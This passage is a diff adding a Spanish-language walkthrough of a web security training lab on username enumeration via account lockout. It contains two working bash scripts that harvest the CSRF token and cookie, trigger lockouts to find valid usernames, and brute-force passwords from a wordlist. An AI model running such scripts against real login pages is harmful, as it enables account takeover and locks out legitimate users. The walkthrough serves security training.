@@ -316,3 +316,114 @@ Al probarlo en el sitio web verificamos que completamos el nivel.
 
 ## 5. Lab: Username enumeration via account lock
 
+```
+https://ac681ff01fdae0fd800c26bb00a700dc.web-security-academy.net/login
+csrf=zus2HXTmtFPFdOSnT7JHTTuVSFIY5KAQ&username=sd&password=sd
+```
+
+Como son intentos para bloquear un usuario, entonces lo que haremos será consultar 4 veces cada usuario de la lista, cuando bloquee a un usuario, será porque ese usuario es válido, acontinuacion el script.
+
+```bash
+#!/bin/bash
+
+URL='https://ac681ff01fdae0fd800c26bb00a700dc.web-security-academy.net/login'
+NULL='/dev/null'
+
+REQUEST1=`curl $URL -D- -s`
+CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
+COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
+
+for USER in `cat user.txt`
+do
+    echo "Probando para USER=$USER"
+    for i in `seq 1 4`
+    do
+	    DATA='csrf='$CSRF'&username='$USER'&password=a'
+	    RESULT=`curl $URL -d $DATA -b $COOKIE -s`
+
+	    if echo $RESULT | grep -oP "Invalid username or password." > $NULL
+	    then
+		    echo -ne ""
+	    else
+		    echo "Valid user: $USER"
+		    break
+	    fi
+    done
+done
+```
+
+Corriendo el escript obtenemos lo siguiente:
+
+![run](img15.png)
+
+Verificando en la web, notamos que si es valido.
+
+![user valid](img16.png)
+
+Ahora agregamos ese error a la lista de respuesta que demuestran que la contraseña es incorrecta y corremos el nuevo script es cual sería
+
+```bash
+#!/bin/bash
+
+URL='https://ac681ff01fdae0fd800c26bb00a700dc.web-security-academy.net/login'
+NULL='/dev/null'
+
+REQUEST1=`curl $URL -D- -s`
+CSRF=`echo $REQUEST1 | grep -oP 'value=".*?"' | cut -d '"' -f 2`
+COOKIE=`echo $REQUEST1 | grep -oP 'session=.*?;'`
+VALID=0
+for USER in `cat user.txt`
+do
+    echo "Probando para USER=$USER"
+    for i in `seq 1 4`
+    do
+	    DATA='csrf='$CSRF'&username='$USER'&password=a'
+	    RESULT=`curl $URL -d $DATA -b $COOKIE -s`
+
+	    if echo $RESULT | grep -oP "Invalid username or password." > $NULL
+	    then
+		    echo -ne ""
+	    else
+		    echo "Valid user: $USER"
+		    VALID=1
+		    break
+	    fi
+    done
+    if [ $VALID == 1 ]
+    then
+        break
+    fi
+done
+
+for PASS in `cat password.txt`;do
+
+    DATA='csrf='$CSRF'&username='$USER'&password='$PASS
+    RESULT=`curl $URL -d $DATA -b $COOKIE -s`
+
+    if echo $RESULT | grep -o "Invalid username or password." > $NULL
+    then
+        echo "Incorrect creds: $USER:$PASS"
+    else
+        if echo $RESULT | grep -o "Please try" > $NULL
+        then
+            echo "Incorrect creds: $USER:$PASS"
+        else
+            echo "Valid creds: $USER:$PASS"
+            break
+        fi
+    fi
+done
+```
+
+Y al correrlo obtener el siguiente resultado:
+
+![output](img17.png)
+
+Y luego de esperar un minuto por el bloqueo, probamos las credenciales y completamos el nivel.
+
+![check](img18.png)
+
+## 6. Lab: Broken brute-force protection, multiple credentials per request
+
+
+
